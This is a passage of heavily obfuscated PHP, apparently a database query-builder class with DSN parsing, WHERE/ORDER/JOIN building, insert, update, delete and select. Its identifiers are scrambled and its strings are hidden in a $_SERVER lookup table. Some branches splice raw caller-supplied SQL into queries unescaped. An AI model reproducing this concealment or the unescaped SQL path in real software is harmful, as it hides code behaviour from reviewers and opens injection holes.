$ÖÈëÖˆ[$èİ¬ñæ¾[891]][$©ğ°÷›ã] : $ÖÈëÖˆ[$èİ¬ñæ¾[891]][0], $èİ¬ñæ¾[892] => isset($ÖÈëÖˆ[$èİ¬ñæ¾[892]][$©ğ°÷›ã]) ? $ÖÈëÖˆ[$èİ¬ñæ¾[892]][$©ğ°÷›ã] : $ÖÈëÖˆ[$èİ¬ñæ¾[892]][0], $èİ¬ñæ¾[889] => isset($ÖÈëÖˆ[$èİ¬ñæ¾[889]][$©ğ°÷›ã]) ? $ÖÈëÖˆ[$èİ¬ñæ¾[889]][$©ğ°÷›ã] : $ÖÈëÖˆ[$èİ¬ñæ¾[889]][0], $èİ¬ñæ¾[890] => isset($ÖÈëÖˆ[$èİ¬ñæ¾[890]][$©ğ°÷›ã]) ? $ÖÈëÖˆ[$èİ¬ñæ¾[890]][$©ğ°÷›ã] : $ÖÈëÖˆ[$èİ¬ñæ¾[890]][0], $èİ¬ñæ¾[21] => isset($ÖÈëÖˆ[$èİ¬ñæ¾[21]][$©ğ°÷›ã]) ? $ÖÈëÖˆ[$èİ¬ñæ¾[21]][$©ğ°÷›ã] : $ÖÈëÖˆ[$èİ¬ñæ¾[21]][0], $èİ¬ñæ¾[919] => isset($ÖÈëÖˆ[$èİ¬ñæ¾[919]][$©ğ°÷›ã]) ? $ÖÈëÖˆ[$èİ¬ñæ¾[919]][$©ğ°÷›ã] : $ÖÈëÖˆ[$èİ¬ñæ¾[919]][0], $èİ¬ñæ¾[17] => isset($ÖÈëÖˆ[$èİ¬ñæ¾[17]][$©ğ°÷›ã]) ? $ÖÈëÖˆ[$èİ¬ñæ¾[17]][$©ğ°÷›ã] : $ÖÈëÖˆ[$èİ¬ñæ¾[17]][0]); return $this->connect($•è°šßØ, $©ğ°÷›ã); } public function parseDSN($ä©ÄÌŞ) { $ˆàû¼Ñ³ =& $_SERVER[Ü©»’·]; if (empty($ä©ÄÌŞ)) { return !1; } $Ôß÷†ı… = parse_url($ä©ÄÌŞ); if ($Ôß÷†ı…[$ˆàû¼Ñ³[180]]) { $“ƒ‰Ò‹ = array($ˆàû¼Ñ³[964] => $Ôß÷†ı…[$ˆàû¼Ñ³[180]], $ˆàû¼Ñ³[891] => isset($Ôß÷†ı…[$ˆàû¼Ñ³[609]]) ? $Ôß÷†ı…[$ˆàû¼Ñ³[609]] : $ˆàû¼Ñ³[12], $ˆàû¼Ñ³[892] => isset($Ôß÷†ı…[$ˆàû¼Ñ³[988]]) ? $Ôß÷†ı…[$ˆàû¼Ñ³[988]] : $ˆàû¼Ñ³[12], $ˆàû¼Ñ³[889] => isset($Ôß÷†ı…[$ˆàû¼Ñ³[181]]) ? $Ôß÷†ı…[$ˆàû¼Ñ³[181]] : $ˆàû¼Ñ³[12], $ˆàû¼Ñ³[890] => isset($Ôß÷†ı…[$ˆàû¼Ñ³[182]]) ? $Ôß÷†ı…[$ˆàû¼Ñ³[182]] : $ˆàû¼Ñ³[12], $ˆàû¼Ñ³[21] => isset($Ôß÷†ı…[$ˆàû¼Ñ³[84]]) ? substr($Ôß÷†ı…[$ˆàû¼Ñ³[84]], 1) : $ˆàû¼Ñ³[12]); } else { preg_match($ˆàû¼Ñ³[989], trim($ä©ÄÌŞ), $¥ƒØ´üş); $“ƒ‰Ò‹ = array($ˆàû¼Ñ³[964] => $¥ƒØ´üş[1], $ˆàû¼Ñ³[891] => $¥ƒØ´üş[2], $ˆàû¼Ñ³[892] => $¥ƒØ´üş[3], $ˆàû¼Ñ³[889] => $¥ƒØ´üş[4], $ˆàû¼Ñ³[890] => $¥ƒØ´üş[5], $ˆàû¼Ñ³[21] => $¥ƒØ´üş[6]); } $“ƒ‰Ò‹[$ˆàû¼Ñ³[919]] = $ˆàû¼Ñ³[12]; return $“ƒ‰Ò‹; } protected function debug() { $Í“±ß½å =& $_SERVER[Ü©»’·]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Í“±ß½å[990]; if (think_config($Í“±ß½å[991])) { think_status($Í“±ß½å[992]); think_trace($this->queryStr . $Í“±ß½å[993] . think_status($Í“±ß½å[24], $Í“±ß½å[992], 6) . $Í“±ß½å[994], $Í“±ß½å[12], $Í“±ß½å[995]); } } protected function parseLock($†–Ù’ëü = false) { $ı‰›““Í =& $_SERVER[Ü©»’·]; if (!$†–Ù’ëü) { return $ı‰›““Í[12]; } if ($ı‰›““Í[921] == $this->dbType) { return $ı‰›““Í[996]; } return $ı‰›““Í[997]; } protected function parseSet($Ş…“ Ö«) { $éªÃ²’• =& $_SERVER[Ü©»’·]; foreach ($Ş…“ Ö« as $°¨‹öšü => $’­¯Ü¯Ë) { if (is_array($’­¯Ü¯Ë) && $éªÃ²’•[297] == $’­¯Ü¯Ë[0]) { $Ïø¦ìÜï[] = $this->parseKey($°¨‹öšü) . $éªÃ²’•[887] . $’­¯Ü¯Ë[1]; } elseif (is_scalar($’­¯Ü¯Ë) || is_null($’­¯Ü¯Ë)) { $Ïø¦ìÜï[] = $this->parseKey($°¨‹öšü) . $éªÃ²’•[887] . $this->parseValue($’­¯Ü¯Ë); } } return $éªÃ²’•[998] . implode($éªÃ²’•[50], $Ïø¦ìÜï); } protected function bindParam($Ğ‘À¨œ‘, $ø¾»ª÷¥) { $this->bind[$_SERVER[Ü©»’·][4] . $Ğ‘À¨œ‘] = $ø¾»ª÷¥; } protected function parseBind($·§Ôæô–) { $·§Ôæô– = array_merge($this->bind, $·§Ôæô–); $this->bind = array(); return $·§Ôæô–; } function parseKey(&$ØæñĞ‰³, $»ËÉé·» = true) { if ($»ËÉé·») { $ØæñĞ‰³ = $this->parseKeyCheck($ØæñĞ‰³); } return $ØæñĞ‰³; } function parseKeyCheck($ú•¹ú†á) { $Ö›‚Í˜ =& $_SERVER[Ü©»’·]; $ú•¹ú†á = trim($ú•¹ú†á); if (!preg_match($Ö›‚Í˜[999], $ú•¹ú†á)) { think_exception($Ö›‚Í˜[1000] . $ú•¹ú†á); } return $ú•¹ú†á; } protected function parseValue($ä´•¼ä) { $ÆîáÒÃª =& $_SERVER[Ü©»’·]; if (is_string($ä´•¼ä)) { $ä´•¼ä = $ÆîáÒÃª[960] . $this->escapeString($ä´•¼ä) . $ÆîáÒÃª[960]; } elseif (isset($ä´•¼ä[0]) && is_string($ä´•¼ä[0]) && strtolower($ä´•¼ä[0]) == $ÆîáÒÃª[297]) { $ä´•¼ä = $this->escapeString($ä´•¼ä[1]); } elseif (is_array($ä´•¼ä)) { $ä´•¼ä = array_map(array($this, $ÆîáÒÃª[961]), $ä´•¼ä); } elseif (is_bool($ä´•¼ä)) { $ä´•¼ä = $ä´•¼ä ? $ÆîáÒÃª[88] : $ÆîáÒÃª[197]; } elseif (is_null($ä´•¼ä)) { $ä´•¼ä = $ÆîáÒÃª[103]; } return $ä´•¼ä; } protected function parseField($„¦µöÓ) { $Œüª×„ =& $_SERVER[Ü©»’·]; if (is_string($„¦µöÓ) && strpos($„¦µöÓ, $Œüª×„[50])) { $„¦µöÓ = explode($Œüª×„[50], $„¦µöÓ); } if (is_array($„¦µöÓ)) { $¤õ²¹Ûì = array(); foreach ($„¦µöÓ as $íĞ™ß => $ºªş•şÅ) { if (!is_numeric($íĞ™ß)) { $¤õ²¹Ûì[] = $this->parseKey($íĞ™ß, !1) . $Œüª×„[1001] . $this->parseKey($ºªş•şÅ); } else { $¤õ²¹Ûì[] = $this->parseKey($ºªş•şÅ); } } $½«„Š‘ = implode($Œüª×„[50], $¤õ²¹Ûì); } elseif (is_string($„¦µöÓ) && !empty($„¦µöÓ)) { $½«„Š‘ = $„¦µöÓ; } else { $½«„Š‘ = $Œüª×„[188]; } return $½«„Š‘; } protected function parseTable($¬ó›øš) { $°ÔÔÀ‹÷ =& $_SERVER[Ü©»’·]; if (is_array($¬ó›øš)) { $óº·á’ = array(); foreach ($¬ó›øš as $ç‹Şë×ª => $Ê”õ…‘ö) { if (!is_numeric($ç‹Şë×ª)) { $óº·á’[] = $this->parseKey($ç‹Şë×ª) . $°ÔÔÀ‹÷[53] . $this->parseKey($Ê”õ…‘ö); } else { $óº·á’[] = $this->parseKey($ç‹Şë×ª); } } $¬ó›øš = $óº·á’; } elseif (is_string($¬ó›øš)) { if (strstr($¬ó›øš, $°ÔÔÀ‹÷[53])) { return $¬ó›øš; } $¬ó›øš = explode($°ÔÔÀ‹÷[50], $¬ó›øš); array_walk($¬ó›øš, array($this, $°ÔÔÀ‹÷[909])); } return $°ÔÔÀ‹÷[903] . trim(implode($°ÔÔÀ‹÷[1002], $¬ó›øš), $°ÔÔÀ‹÷[394]) . $°ÔÔÀ‹÷[903]; } protected function parseWhere($“»ü¤Ä») { $ı„¼úğ =& $_SERVER[Ü©»’·]; $Á×ë›¢É = $ı„¼úğ[12]; if (is_string($“»ü¤Ä»)) { $Á×ë›¢É = $“»ü¤Ä»; } else { $…˜¤÷¿ö = isset($“»ü¤Ä»[$ı„¼úğ[1003]]) ? strtoupper($“»ü¤Ä»[$ı„¼úğ[1003]]) : $ı„¼úğ[12]; if (in_array($…˜¤÷¿ö, array($ı„¼úğ[1004], $ı„¼úğ[1005], $ı„¼úğ[1006]))) { $…˜¤÷¿ö = $ı„¼úğ[53] . $…˜¤÷¿ö . $ı„¼úğ[53]; unset($“»ü¤Ä»[$ı„¼úğ[1003]]); } else { $…˜¤÷¿ö = $ı„¼úğ[1007]; } foreach ($“»ü¤Ä» as $¤³ÈËãğ => $àŸ®Âğ) { $Á×ë›¢É .= $ı„¼úğ[277]; if (is_numeric($¤³ÈËãğ)) { $¤³ÈËãğ = $ı„¼úğ[1008]; } if (0 === strpos($¤³ÈËãğ, $ı„¼úğ[11])) { $Á×ë›¢É .= $this->parseThinkWhere($¤³ÈËãğ, $àŸ®Âğ); } else { if (!preg_match($ı„¼úğ[1009], trim($¤³ÈËãğ))) { think_exception(think_lang($ı„¼úğ[1010]) . $ı„¼úğ[4] . $¤³ÈËãğ); } $ËŸ—‘·¶ = is_array($àŸ®Âğ) && isset($àŸ®Âğ[$ı„¼úğ[1011]]); $¤³ÈËãğ = trim($¤³ÈËãğ); if (strpos($¤³ÈËãğ, $ı„¼úğ[283])) { $ë‚‘ÙÌÏ = explode($ı„¼úğ[283], $¤³ÈËãğ); $ä€¶Î» = array(); foreach ($ë‚‘ÙÌÏ as $İó„¢Ùñ => $¿Ä¯®ÂÖ) { $Êü”¥Û¨ = $ËŸ—‘·¶ ? $àŸ®Âğ[$İó„¢Ùñ] : $àŸ®Âğ; $ä€¶Î»[] = $ı„¼úğ[260] . $this->parseWhereItem($this->parseKey($¿Ä¯®ÂÖ), $Êü”¥Û¨) . $ı„¼úğ[908]; } $Á×ë›¢É .= implode($ı„¼úğ[1012], $ä€¶Î»); } elseif (strpos($¤³ÈËãğ, $ı„¼úğ[284])) { $ë‚‘ÙÌÏ = explode($ı„¼úğ[284], $¤³ÈËãğ); $ä€¶Î» = array(); foreach ($ë‚‘ÙÌÏ as $İó„¢Ùñ => $¿Ä¯®ÂÖ) { $Êü”¥Û¨ = $ËŸ—‘·¶ ? $àŸ®Âğ[$İó„¢Ùñ] : $àŸ®Âğ; $ä€¶Î»[] = $ı„¼úğ[260] . $this->parseWhereItem($this->parseKey($¿Ä¯®ÂÖ), $Êü”¥Û¨) . $ı„¼úğ[908]; } $Á×ë›¢É .= implode($ı„¼úğ[1007], $ä€¶Î»); } else { $Á×ë›¢É .= $this->parseWhereItem($this->parseKey($¤³ÈËãğ), $àŸ®Âğ); } } $Á×ë›¢É .= $ı„¼úğ[278] . $…˜¤÷¿ö; } $Á×ë›¢É = substr($Á×ë›¢É, 0, -strlen($…˜¤÷¿ö)); } return empty($Á×ë›¢É) ? $ı„¼úğ[12] : $ı„¼úğ[1013] . $Á×ë›¢É; } protected function parseWhereItem($º’ü‚Ø¶, $øßóµ›ã) { $åœ“§‡ó =& $_SERVER[Ü©»’·]; $¾èûŞ©‹ = $åœ“§‡ó[12]; if (is_array($øßóµ›ã)) { if (is_string($øßóµ›ã[0])) { $Ä¤¨„­µ = strtolower($øßóµ›ã[0]); if (in_array($øßóµ›ã[0], array($åœ“§‡ó[887], $åœ“§‡ó[1014], $åœ“§‡ó[1015], $åœ“§‡ó[1016], $åœ“§‡ó[1017], $åœ“§‡ó[1018]))) { $¾èûŞ©‹ .= $º’ü‚Ø¶ . $åœ“§‡ó[53] . $øßóµ›ã[0] . $åœ“§‡ó[53] . $this->parseValue($øßóµ›ã[1]); } elseif (preg_match($åœ“§‡ó[1019], $øßóµ›ã[0])) { $¾èûŞ©‹ .= $º’ü‚Ø¶ . $åœ“§‡ó[53] . $this->exp[$Ä¤¨„­µ] . $åœ“§‡ó[53] . $this->parseValue($øßóµ›ã[1]); } elseif (preg_match($åœ“§‡ó[1020], $øßóµ›ã[0])) { if (is_array($øßóµ›ã[1])) { $÷ÕÂ«ñÃ = isset($øßóµ›ã[2]) ? strtoupper($øßóµ›ã[2]) : $åœ“§‡ó[1005]; if (in_array($÷ÕÂ«ñÃ, array($åœ“§‡ó[1004], $åœ“§‡ó[1005], $åœ“§‡ó[1006]))) { $õîÕ§® = array(); foreach ($øßóµ›ã[1] as $¦ºşîş) { $õîÕ§®[] = $º’ü‚Ø¶ . $åœ“§‡ó[53] . $this->exp[$Ä¤¨„­µ] . $åœ“§‡ó[53] . $this->parseValue($¦ºşîş); } $¾èûŞ©‹ .= $åœ“§‡ó[260] . implode($åœ“§‡ó[53] . $÷ÕÂ«ñÃ . $åœ“§‡ó[53], $õîÕ§®) . $åœ“§‡ó[908]; } } else { $¾èûŞ©‹ .= $º’ü‚Ø¶ . $åœ“§‡ó[53] . $this->exp[$Ä¤¨„­µ] . $åœ“§‡ó[53] . $this->parseValue($øßóµ›ã[1]); } } elseif ($åœ“§‡ó[297] == $Ä¤¨„­µ) { $¾èûŞ©‹ .= $åœ“§‡ó[906] . $º’ü‚Ø¶ . $åœ“§‡ó[53] . $øßóµ›ã[1] . $åœ“§‡ó[1021]; } elseif (preg_match($åœ“§‡ó[1022], $øßóµ›ã[0])) { $¾èûŞ©‹ .= $øßóµ›ã[0]; } elseif (preg_match($åœ“§‡ó[1023], $øßóµ›ã[0])) { if (isset($øßóµ›ã[2]) && $åœ“§‡ó[297] == $øßóµ›ã[2]) { $¾èûŞ©‹ .= $º’ü‚Ø¶ . $åœ“§‡ó[53] . $this->exp[$Ä¤¨„­µ] . $åœ“§‡ó[53] . $øßóµ›ã[1]; } else { if (is_string($øßóµ›ã[1])) { $øßóµ›ã[1] = explode($åœ“§‡ó[50], $øßóµ›ã[1]); } $„İß÷ = implode($åœ“§‡ó[50], $this->parseValue($øßóµ›ã[1])); $¾èûŞ©‹ .= $º’ü‚Ø¶ . $åœ“§‡ó[53] . $this->exp[$Ä¤¨„­µ] . $åœ“§‡ó[906] . $„İß÷ . $åœ“§‡ó[908]; } } elseif (preg_match($åœ“§‡ó[1024], $øßóµ›ã[0])) { $«¼÷æÒœ = is_string($øßóµ›ã[1]) ? explode($åœ“§‡ó[50], $øßóµ›ã[1]) : $øßóµ›ã[1]; $¾èûŞ©‹ .= $åœ“§‡ó[906] . $º’ü‚Ø¶ . $åœ“§‡ó[53] . $this->exp[$Ä¤¨„­µ] . $åœ“§‡ó[53] . $this->parseValue($«¼÷æÒœ[0]) . $åœ“§‡ó[1007] . $this->parseValue($«¼÷æÒœ[1]) . $åœ“§‡ó[278]; } else { think_exception(think_lang($åœ“§‡ó[1010]) . $åœ“§‡ó[4] . $øßóµ›ã[0]); } } else { $°°Úƒ°µ = count($øßóµ›ã); $Ùõî–¡ = $åœ“§‡ó[12]; if (is_string($øßóµ›ã[$°°Úƒ°µ - 1])) { $Ùõî–¡ = isset($øßóµ›ã[$°°Úƒ°µ - 1]) ? strtoupper($øßóµ›ã[$°°Úƒ°µ - 1]) : $åœ“§‡ó[12]; if (in_array($Ùõî–¡, array($åœ“§‡ó[1004], $åœ“§‡ó[1005], $åœ“§‡ó[1006]))) { $°°Úƒ°µ = $°°Úƒ°µ - 1; } } else { $Ùõî–¡ = $åœ“§‡ó[1004]; } for ($„é¸®Ê = 0; $„é¸®Ê < $°°Úƒ°µ; $„é¸®Ê++) { $«¼÷æÒœ = is_array($øßóµ›ã[$„é¸®Ê]) ? $øßóµ›ã[$„é¸®Ê][1] : $øßóµ›ã[$„é¸®Ê]; if ($åœ“§‡ó[297] == strtolower($øßóµ›ã[$„é¸®Ê][0])) { $¾èûŞ©‹ .= $åœ“§‡ó[260] . $º’ü‚Ø¶ . $åœ“§‡ó[53] . $«¼÷æÒœ . $åœ“§‡ó[1021] . $Ùõî–¡ . $åœ“§‡ó[53]; } else { $ãÓ”çæ» = is_array($øßóµ›ã[$„é¸®Ê]) ? $this->exp[strtolower($øßóµ›ã[$„é¸®Ê][0])] : $åœ“§‡ó[887]; if (!$ãÓ”çæ» && is_array($øßóµ›ã[$„é¸®Ê]) && in_array($øßóµ›ã[$„é¸®Ê][0], array($åœ“§‡ó[887], $åœ“§‡ó[1014], $åœ“§‡ó[1015], $åœ“§‡ó[1016], $åœ“§‡ó[1017], $åœ“§‡ó[1018]))) { $ãÓ”çæ» = $øßóµ›ã[$„é¸®Ê][0]; } $¾èûŞ©‹ .= $åœ“§‡ó[260] . $º’ü‚Ø¶ . $åœ“§‡ó[53] . $ãÓ”çæ» . $åœ“§‡ó[53] . $this->parseValue($«¼÷æÒœ) . $åœ“§‡ó[1021] . $Ùõî–¡ . $åœ“§‡ó[53]; } } $¾èûŞ©‹ = substr($¾èûŞ©‹, 0, -4); } } else { $¾èûŞ©‹ .= $º’ü‚Ø¶ . $åœ“§‡ó[1025] . $this->parseValue($øßóµ›ã); } return $¾èûŞ©‹; } protected function parseThinkWhere($§Ä²¨Ìì, $ÉÀÓÛí) { $öŠƒ«õª =& $_SERVER[Ü©»’·]; $îèÄıÀœ = $öŠƒ«õª[12]; switch ($§Ä²¨Ìì) { case $öŠƒ«õª[352]: $îèÄıÀœ = $ÉÀÓÛí; break; case $öŠƒ«õª[1008]: $îèÄıÀœ = is_string($ÉÀÓÛí) ? $ÉÀÓÛí : substr($this->parseWhere($ÉÀÓÛí), 6); break; case $öŠƒ«õª[1026]: parse_str($ÉÀÓÛí, $§ö–“); if (isset($§ö–“[$öŠƒ«õª[1003]])) { $Ú§‡®ßƒ = $öŠƒ«õª[53] . strtoupper($§ö–“[$öŠƒ«õª[1003]]) . $öŠƒ«õª[53]; unset($§ö–“[$öŠƒ«õª[1003]]); } else { $Ú§‡®ßƒ = $öŠƒ«õª[1007]; } $Õ¡¢ÌÍ = array(); foreach ($§ö–“ as $â´°ó• => $íË­¹) { $Õ¡¢ÌÍ[] = $this->parseKey($â´°ó•) . $öŠƒ«õª[1025] . $this->parseValue($íË­¹); } $îèÄıÀœ = implode($Ú§‡®ßƒ, $Õ¡¢ÌÍ); break; } return $îèÄıÀœ; } protected function parseLimit($¬ç†ÔèØ) { $®¢œ¨Ô½ =& $_SERVER[Ü©»’·]; return !empty($¬ç†ÔèØ) ? $®¢œ¨Ô½[51] . $¬ç†ÔèØ . $®¢œ¨Ô½[53] : $®¢œ¨Ô½[12]; } protected function parseJoin($ÚùÚ¹Ş§) { $¼ÍÈ¬şœ =& $_SERVER[Ü©»’·]; $ÒÇò¸·˜ = $¼ÍÈ¬şœ[12]; if (!empty($ÚùÚ¹Ş§)) { if (is_array($ÚùÚ¹Ş§)) { foreach ($ÚùÚ¹Ş§ as $îÓŸúáÄ => $¿‰ü–ë˜) { if (!1 !== stripos($¿‰ü–ë˜, $¼ÍÈ¬şœ[1027])) { $ÒÇò¸·˜ .= $¼ÍÈ¬şœ[53] . $¿‰ü–ë˜; } else { $ÒÇò¸·˜ .= $¼ÍÈ¬şœ[1028] . $¿‰ü–ë˜; } } } else { $ÒÇò¸·˜ .= $¼ÍÈ¬şœ[1028] . $ÚùÚ¹Ş§; } } $ÒÇò¸·˜ = preg_replace($¼ÍÈ¬şœ[1029], think_config($¼ÍÈ¬şœ[933]) . $¼ÍÈ¬şœ[1030], $ÒÇò¸·˜); return $ÒÇò¸·˜; } protected function parseOrder($¸ç÷Œî¸) { $Íê¬ñ‚í =& $_SERVER[Ü©»’·]; if (is_array($¸ç÷Œî¸)) { $£áö‚µ· = array(); foreach ($¸ç÷Œî¸ as $ ¯š¹Ç => $ÂİùŸÅ) { if (is_numeric($ ¯š¹Ç)) { $£áö‚µ·[] = $this->parseKey($ÂİùŸÅ); } else { $ÂİùŸÅ = in_array(strtoupper(trim($ÂİùŸÅ)), array($Íê¬ñ‚í[1031], $Íê¬ñ‚í[1032])) ? $Íê¬ñ‚í[53] . $ÂİùŸÅ : $Íê¬ñ‚í[12]; if (preg_match($Íê¬ñ‚í[1033], $ ¯š¹Ç)) { $£áö‚µ·[] = $this->parseKey($ ¯š¹Ç) . $ÂİùŸÅ; } else { think_exception($Íê¬ñ‚í[1034] . $ ¯š¹Ç); } } } $¸ç÷Œî¸ = implode($Íê¬ñ‚í[50], $£áö‚µ·); } return !empty($¸ç÷Œî¸) ? $Íê¬ñ‚í[1035] . $¸ç÷Œî¸ : $Íê¬ñ‚í[12]; } protected function parseGroup($ßå¹Ç•) { $¬š“ÓÑİ =& $_SERVER[Ü©»’·]; return !empty($ßå¹Ç•) ? $¬š“ÓÑİ[1036] . $ßå¹Ç• : $¬š“ÓÑİ[12]; } protected function parseHaving($ã¾‚¼¼) { $œÕ¢‹±÷ =& $_SERVER[Ü©»’·]; return !empty($ã¾‚¼¼) ? $œÕ¢‹±÷[1037] . $ã¾‚¼¼ : $œÕ¢‹±÷[12]; } protected function parseComment($şŠ­¡) { $¸€ß±Ş™ =& $_SERVER[Ü©»’·]; return !empty($şŠ­¡) ? $¸€ß±Ş™[1038] . $şŠ­¡ . $¸€ß±Ş™[1039] : $¸€ß±Ş™[12]; } protected function parseDistinct($Ù©’¶äú) { $ÉãŞ’è =& $_SERVER[Ü©»’·]; return !empty($Ù©’¶äú) ? $ÉãŞ’è[1040] : $ÉãŞ’è[12]; } protected function parseUnion($©ı‰¢Î) { $©™±áµÍ =& $_SERVER[Ü©»’·]; if (empty($©ı‰¢Î)) { return $©™±áµÍ[12]; } if (isset($©ı‰¢Î[$©™±áµÍ[348]])) { $íŒ¡§€ = $©™±áµÍ[1041]; unset($©ı‰¢Î[$©™±áµÍ[348]]); } else { $íŒ¡§€ = $©™±áµÍ[1042]; } foreach ($©ı‰¢Î as $ê£ª¹•Ü) { $›È­Û¨­[] = $íŒ¡§€ . (is_array($ê£ª¹•Ü) ? $this->buildSelectSql($ê£ª¹•Ü) : $ê£ª¹•Ü); } return implode($©™±áµÍ[53], $›È­Û¨­); } public function insert($ùâ·ô», $¯âÌê = array(), $’™™À¤ = false) { $´—…‹í =& $_SERVER[Ü©»’·]; $¢¥´…Şô = $ïËòÃô = array(); $this->model = $¯âÌê[$´—…‹í[281]]; foreach ($ùâ·ô» as $ê¤©ŸõÈ => $ÓàÅ²Œ) { if (is_array($ÓàÅ²Œ) && $´—…‹í[297] == $ÓàÅ²Œ[0]) { $ïËòÃô[] = $this->parseKey($ê¤©ŸõÈ); $¢¥´…Şô[] = $ÓàÅ²Œ[1]; } elseif (is_scalar($ÓàÅ²Œ) || is_null($ÓàÅ²Œ)) { $ïËòÃô[] = $this->parseKey($ê¤©ŸõÈ); $¢¥´…Şô[] = $this->parseValue($ÓàÅ²Œ); } } $ŒÜˆ…¾ = ($’™™À¤ ? $´—…‹í[910] : $´—…‹í[911]) . $´—…‹í[912] . $this->parseTable($¯âÌê[$´—…‹í[279]]) . $´—…‹í[906] . implode($´—…‹í[50], $ïËòÃô) . $´—…‹í[907] . implode($´—…‹í[50], $¢¥´…Şô) . $´—…‹í[908]; $ŒÜˆ…¾ .= $this->parseLock(isset($¯âÌê[$´—…‹í[849]]) ? $¯âÌê[$´—…‹í[849]] : !1); $ŒÜˆ…¾ .= $this->parseComment(!empty($¯âÌê[$´—…‹í[354]]) ? $¯âÌê[$´—…‹í[354]] : $´—…‹í[12]); return $this->execute($ŒÜˆ…¾, $this->parseBind(!empty($¯âÌê[$´—…‹í[285]]) ? $¯âÌê[$´—…‹í[285]] : array())); } public function selectInsert($§Èæİæ¨, $›ùÂ¶€Ä, $åÒÜ÷‡µ = array()) { $…±è¬‘ =& $_SERVER[Ü©»’·]; $this->model = $åÒÜ÷‡µ[$…±è¬‘[281]]; if (is_string($§Èæİæ¨)) { $§Èæİæ¨ = explode($…±è¬‘[50], $§Èæİæ¨); } array_walk($§Èæİæ¨, array($this, $…±è¬‘[909])); $ÖöÁ”òœ = $…±è¬‘[1043] . $this->parseTable($›ùÂ¶€Ä) . $…±è¬‘[906] . implode($…±è¬‘[50], $§Èæİæ¨) . $…±è¬‘[1021]; $ÖöÁ”òœ .= $this->buildSelectSql($åÒÜ÷‡µ); return $this->execute($ÖöÁ”òœ, $this->parseBind(!empty($åÒÜ÷‡µ[$…±è¬‘[285]]) ? $åÒÜ÷‡µ[$…±è¬‘[285]] : array())); } public function update($Â‰Çú‡¦, $Îô€Éì†) { $Õ½«‚†Š =& $_SERVER[Ü©»’·]; $this->model = $Îô€Éì†[$Õ½«‚†Š[281]]; $ôåÖü¨Î = $Õ½«‚†Š[1044] . $this->parseTable($Îô€Éì†[$Õ½«‚†Š[279]]) . $this->parseSet($Â‰Çú‡¦) . $this->parseWhere(!empty($Îô€Éì†[$Õ½«‚†Š[275]]) ? $Îô€Éì†[$Õ½«‚†Š[275]] : $Õ½«‚†Š[12]) . $this->parseOrder(!empty($Îô€Éì†[$Õ½«‚†Š[374]]) ? $Îô€Éì†[$Õ½«‚†Š[374]] : $Õ½«‚†Š[12]) . $this->parseLimit(!empty($Îô€Éì†[$Õ½«‚†Š[292]]) ? $Îô€Éì†[$Õ½«‚†Š[292]] : $Õ½«‚†Š[12]) . $this->parseLock(isset($Îô€Éì†[$Õ½«‚†Š[849]]) ? $Îô€Éì†[$Õ½«‚†Š[849]] : !1) . $this->parseComment(!empty($Îô€Éì†[$Õ½«‚†Š[354]]) ? $Îô€Éì†[$Õ½«‚†Š[354]] : $Õ½«‚†Š[12]); return $this->execute($ôåÖü¨Î, $this->parseBind(!empty($Îô€Éì†[$Õ½«‚†Š[285]]) ? $Îô€Éì†[$Õ½«‚†Š[285]] : array())); } public function delete($ú—¬íî = array()) { $´›¤İŞ =& $_SERVER[Ü©»’·]; $this->model = $ú—¬íî[$´›¤İŞ[281]]; $¬ÃÖá–§ = $´›¤İŞ[1045] . $this->parseTable($ú—¬íî[$´›¤İŞ[279]]) . $this->parseWhere(!empty($ú—¬íî[$´›¤İŞ[275]]) ? $ú—¬íî[$´›¤İŞ[275]] : $´›¤İŞ[12]) . $this->parseOrder(!empty($ú—¬íî[$´›¤İŞ[374]]) ? $ú—¬íî[$´›¤İŞ[374]] : $´›¤İŞ[12]) . $this->parseLimit(!empty($ú—¬íî[$´›¤İŞ[292]]) ? $ú—¬íî[$´›¤İŞ[292]] : $´›¤İŞ[12]) . $this->parseLock(isset($ú—¬íî[$´›¤İŞ[849]]) ? $ú—¬íî[$´›¤İŞ[849]] : !1) . $this->parseComment(!empty($ú—¬íî[$´›¤İŞ[354]]) ? $ú—¬íî[$´›¤İŞ[354]] : $´›¤İŞ[12]); return $this->execute($¬ÃÖá–§, $this->parseBind(!empty($ú—¬íî[$´›¤İŞ[285]]) ? $ú—¬íî[$´›¤İŞ[285]] : array())); } public function select($’È½òŒ = array()) { $†ÕøÕ©‚ =& $_SERVER[Ü©»’·]; $this->model = $’È½òŒ[$†ÕøÕ©‚[281]]; $²ÍçÄõ = $this->buildSelectSql($’È½òŒ); $´…ªûˆ¡ = isset($’È½òŒ[$†ÕøÕ©‚[349]]) ? $’È½òŒ[$†ÕøÕ©‚[349]] : !1; if ($´…ªûˆ¡) { $¼Å½‹Ê” = is_string($´…ªûˆ¡[$†ÕøÕ©‚[94]]) ? $´…ªûˆ¡[$†ÕøÕ©‚[94]] : $†ÕøÕ©‚[1046] . md5($²ÍçÄõ); $ò†ÓÏºû = think_cache($¼Å½‹Ê”, $†ÕøÕ©‚[12], $´…ªûˆ¡); if (!1 !== $ò†ÓÏºû) { return $ò†ÓÏºû; } } $’ûÛ¥†Ü = $this->query($²ÍçÄõ, $this->parseBind(!empty($’È½òŒ[$†ÕøÕ©‚[285]]) ? $’È½òŒ[$†ÕøÕ©‚[285]] : array())); if ($´…ªûˆ¡ && !1 !== $’ûÛ¥†Ü) { think_cache($¼Å½‹Ê”, $’ûÛ¥†Ü, $´…ªûˆ¡); } return $’ûÛ¥†Ü; } public function buildSelectSql($Ê¨¿Àçï = array()) { $àíñæ…š =& $_SERVER[Ü©»’·]; if (isset($Ê¨¿Àçï[$àíñæ…š[353]])) { if (strpos($Ê¨¿Àçï[$àíñæ…š[353]], $àíñæ…š[50])) { list($ı¿š®½Ğ, $¬é©Ñ§·) = explode($àíñæ…š[50], $Ê¨¿Àçï[$àíñæ…š[353]]); } else { $ı¿š®½Ğ = $Ê¨¿Àçï[$àíñæ…š[353]]; } $ı¿š®½Ğ = $ı¿š®½Ğ ? $ı¿š®½Ğ : 1; $¬é©Ñ§· = isset($¬é©Ñ§·) ? $¬é©Ñ§· : (is_numeric($Ê¨¿Àçï[$àíñæ…š[292]]) ? $Ê¨¿Àçï[$àíñæ…š[292]] : 20); $Ø³»†Æ = $¬é©Ñ§· * ((int) $ı¿š®½Ğ - 1); $Ê¨¿Àçï[$àíñæ…š[292]] = $Ø³»†Æ . $àíñæ…š[50] . $¬é©Ñ§·; } if (think_config($àíñæ…š[1047])) { $¶ ¤û²¼ = $àíñæ…š[1048] . md5(serialize($Ê¨¿Àçï)); $§´ş±ñø = think_cache($¶ ¤û²¼); if 